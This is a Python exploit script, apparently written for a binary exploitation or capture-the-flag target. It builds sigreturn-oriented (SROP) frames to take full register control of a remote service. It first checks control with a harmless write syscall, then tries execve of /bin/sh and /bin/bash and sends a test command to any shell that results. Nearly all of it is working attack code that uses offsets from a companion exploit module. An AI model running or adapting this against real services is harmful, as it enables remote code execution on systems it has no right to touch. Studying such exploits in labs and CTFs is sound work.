#!/usr/bin/env python3
"""Can the sigreturn-restored context run an arbitrary syscall with my arguments?

execve("/bin/sh") ended with the connection reset and no output at all, which is
neither "execve returned an error" (the restart bait in the frame would have leaked
8 bytes) nor "a shell is waiting" (it would answer commands).  So find out whether
the restored context works at all by asking for something observable and harmless:

    rip = 0x401069   rax = 1(write)  rdi = 1  rsi = buf+0x20  rdx = 32

32 bytes of a planted pattern coming back proves full register control through
rt_sigreturn, and isolates execve - either seccomp kills it or the path is missing.
Every address is derived from that connection's own leak.
"""
import socket
import struct
import time
import importlib.util

spec = importlib.util.spec_from_file_location("e", "exploit.py")
e = importlib.util.module_from_spec(spec)
spec.loader.exec_module(e)

PATTERN = bytes(range(0x10, 0x30))


def body_write(buf):
    body = bytearray(b"\x90" * (e.FRAME_AT + e.FRAME_LEN))
    body[0x20:0x20 + len(PATTERN)] = PATTERN
    struct.pack_into("<Q", body, e.OFF_G1, e.G1)
    struct.pack_into("<Q", body, e.OFF_SC, e.SC)
    struct.pack_into("<Q", body, e.OFF_BAIT, e.RESTART)
    for off, val in ((e.F_RIP, e.SC), (e.F_RSP, buf + e.OFF_BAIT),
                     (e.F_RAX, 1), (e.F_RDI, 1), (e.F_RSI, buf + 0x20),
                     (e.F_RDX, len(PATTERN)), (e.F_EFLAGS, 0x246),
                     (e.F_SEL, 0x33 | (0x2B << 48)), (e.F_FPSTATE, 0)):
        struct.pack_into("<Q", body, e.FRAME_AT + off, val)
    return bytes(body)


def body_execve(buf, path_off, path):
    body = bytearray(b"\x90" * (e.FRAME_AT + e.FRAME_LEN))
    body[path_off:path_off + len(path) + 1] = path + b"\x00"
    body[0x30:0x38] = struct.pack("<Q", buf + path_off)
    body[0x38:0x40] = struct.pack("<Q", 0)
    struct.pack_into("<Q", body, e.OFF_G1, e.G1)
    struct.pack_into("<Q", body, e.OFF_SC, e.SC)
    struct.pack_into("<Q", body, e.OFF_BAIT, e.RESTART)
    for off, val in ((e.F_RIP, e.SC), (e.F_RSP, buf + e.OFF_BAIT),
                     (e.F_RAX, 59), (e.F_RDI, buf + path_off), (e.F_RSI, buf + 0x30),
                     (e.F_RDX, 0), (e.F_EFLAGS, 0x246),
                     (e.F_SEL, 0x33 | (0x2B << 48)), (e.F_FPSTATE, 0)):
        struct.pack_into("<Q", body, e.FRAME_AT + off, val)
    return bytes(body)


def run(label, builder, feed_cmd=None, wait=2.5):
    s = socket.create_connection((e.HOST, e.PORT), timeout=25)
    try:
        L = struct.unpack("<Q", e.recvn(s, 8))[0]
        buf = (L - 0x80) & 0xFFFFFFFFFFFFFFFF
        s.sendall(b"\x90" * 24 + builder(buf))
        time.sleep(0.5)
        pre = e.drain(s, 0.3)
        s.sendall(b"Z" * 15)
        time.sleep(0.5)
        got = pre + e.drain(s, wait)
        print("%-26s buf=%#x n=%-3d %r" % (label, buf, len(got), got[:48]))
        if feed_cmd is not None and len(got) != 8:
            try:
                s.sendall((feed_cmd + "\n").encode())
                time.sleep(0.8)
                o2 = e.drain(s, 2.5)
                print("%-26s cmd reply n=%d %r" % ("", len(o2), o2[:160]))
            except OSError as ex:
                print("%-26s cmd failed: %r" % ("", ex))
        return got
    finally:
        s.close()
    time.sleep(0.6)


if __name__ == "__main__":
    run("write(1,buf+0x20,32)", body_write)
    run("execve /bin/sh", lambda b: body_execve(b, 0x20, b"/bin/sh"), "echo HI")
    run("execve /bin/bash", lambda b: body_execve(b, 0x20, b"/bin/bash"), "echo HI")
